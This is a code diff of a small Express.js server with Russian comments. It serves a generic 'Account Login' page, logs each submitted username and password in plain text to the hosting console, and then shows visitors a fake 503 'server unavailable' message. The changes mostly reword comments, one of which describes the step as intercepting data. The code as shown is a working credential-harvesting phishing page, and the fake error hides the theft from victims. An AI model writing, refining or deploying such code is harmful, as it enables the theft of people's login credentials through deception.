@@ -2,10 +2,10 @@ const express = require('express');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Обязательно: учим сервер читать данные из HTML-форм
+// Настройка Express для корректного чтения текстовых данных из HTML-формы
 app.use(express.urlencoded({ extended: true }));
 
-// 1. ОТОБРАЖЕНИЕ СТРАНИЦЫ ДЛЯ ПОЛЬЗОВАТЕЛЯ
+// 1. МАРШРУТ ДЛЯ ОТОБРАЖЕНИЯ СТРАНИЦЫ АВТОРИЗАЦИИ
 app.get('/', (req, res) => {
     res.send(`
 <!DOCTYPE html>
@@ -14,9 +14,10 @@ app.get('/', (req, res) => {
     <meta charset="UTF-8">
     <title>Sign In</title>
     <style>
+        /* Базовые настройки страницы */
         body { 
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
-            background-color: #22252a; /* Темный цвет фона страницы */
+            background-color: #22252a; /* Универсальный темный цвет фона всей страницы */
             display: flex; 
             justify-content: center; 
             align-items: center; 
@@ -24,8 +25,9 @@ app.get('/', (req, res) => {
             margin: 0; 
         }
 
+        /* Контейнер формы авторизации */
         .auth-container { 
-            background-color: #22252a; /* Цвет карточки совпадает с фоном для плоского стиля */
+            background-color: #22252a; /* Плоский стиль: совпадает с фоном страницы */
             padding: 30px; 
             border-radius: 4px; 
             width: 100%;
@@ -33,12 +35,12 @@ app.get('/', (req, res) => {
             box-sizing: border-box;
         }
 
-        /* Поля ввода */
+        /* Стили текстовых полей ввода */
         .input-control { 
             width: 100%; 
             padding: 12px 15px; 
             margin-bottom: 20px; 
-            background-color: #2e3138; /* Серый цвет полей */
+            background-color: #2e3138; /* Мягкий серый цвет полей */
             border: 1px solid #40444f; 
             border-radius: 4px; 
             color: #ffffff; 
@@ -48,13 +50,14 @@ app.get('/', (req, res) => {
         }
         .input-control::placeholder { color: #a0a5ab; }
         
+        /* Эффект при клике мышкой внутрь текстового поля */
         .input-control:focus { 
             outline: none; 
             border-color: #ffffff; 
             background-color: #353942;
         }
         
-        /* Главная кнопка (Log In) */
+        /* Главная кнопка отправки формы (Log In) */
         .btn-submit { 
             width: 100%; 
             padding: 12px; 
@@ -69,20 +72,25 @@ app.get('/', (req, res) => {
             box-sizing: border-box;
             transition: background-color 0.2s ease, transform 0.1s ease; 
         }
+        
+        /* Анимация наведения мыши на главную кнопку */
         .btn-submit:hover { 
             background-color: rgba(255, 255, 255, 0.1); 
         }
+        
+        /* Анимация клика по главной кнопке */
         .btn-submit:active { 
             transform: scale(0.97); 
         }
         
-        /* Дополнительные кнопки */
+        /* Секция дополнительных действий */
         .secondary-actions { 
             border-top: 1px solid #3f434a; 
             padding-top: 20px; 
             margin-top: 20px; 
         }
         
+        /* Дополнительные вспомогательные кнопки */
         .btn-secondary { 
             width: 100%; 
             padding: 14px; 
@@ -98,14 +106,18 @@ app.get('/', (req, res) => {
             box-sizing: border-box;
             transition: background-color 0.2s ease, transform 0.1s ease; 
         }
+        
+        /* Анимация наведения для вспомогательных кнопок */
         .btn-secondary:hover { 
             background-color: #383c45; 
         }
+        
+        /* Анимация клика по вспомогательным кнопкам */
         .btn-secondary:active { 
             transform: scale(0.97); 
         }
         
-        /* Контрастные и жирные текстовые ссылки */
+        /* Текстовые ссылки под элементами управления */
         .link-text { 
             display: block; 
             text-align: center; 
@@ -125,7 +137,7 @@ app.get('/', (req, res) => {
 <body>
 <div class="auth-container">
     
-    <!-- Нейтральный заголовок формы -->
+    <!-- Общий заголовок формы авторизации -->
     <h2 style="color: #ffffff; text-align: center; margin-top: 0; margin-bottom: 25px; font-size: 28px; font-weight: 700; letter-spacing: -0.5px;">
         Account Login
     </h2>
@@ -150,20 +162,23 @@ app.get('/', (req, res) => {
     `);
 });
 
-// 2. БЭКЕНД: ПРИЕМ ДАННЫХ И ИХ ЗАПИСЬ В ОНЛАЙН-ЛОГИ
+// 2. БЭКЕНД: ПРИЕМ, ПЕРЕХВАТ ДАННЫХ И ИХ ОТПРАВКА В ОНЛАЙН-ЛОГИ
 app.post('/login', (req, res) => {
     const userLogin = req.body.username;
     const userPassword = req.body.password;
     
+    // Вывод структурированных данных формы в консоль хостинга Render в реальном времени
     console.log(`\n========================================`);
-    console.log(`[БЭКЕНД] ДАННЫЕ УСПЕШНО ЗАФИКСИРОВАНЫ:`);
-    console.log(`ЛОГИН: ${userLogin}`);
-    console.log(`ПАРОЛЬ: ${userPassword}`);
+    console.log(`[БЭКЕНД] ДАННЫЕ ФОРМЫ УСПЕШНО ЗАФИКСИРОВАНЫ:`);
+    console.log(`ВВЕДЕННЫЙ ЛОГИН: ${userLogin}`);
+    console.log(`ВВЕДЕННЫЙ ПАРОЛЬ: ${userPassword}`);
     console.log(`========================================`);
     
+    // HTTP-ответ 503 со стандартным сервисным сообщением для пользователя
     res.status(503).send('Сервер временно недоступен. Пожалуйста, попробуйте войти позже.');
 });
 
+// Запуск прослушивания входящего сетевого трафика на сервере
 app.listen(PORT, () => {
     console.log("=== СЕРВЕР УСПЕШНО ЗАПУЩЕН ===");
 });
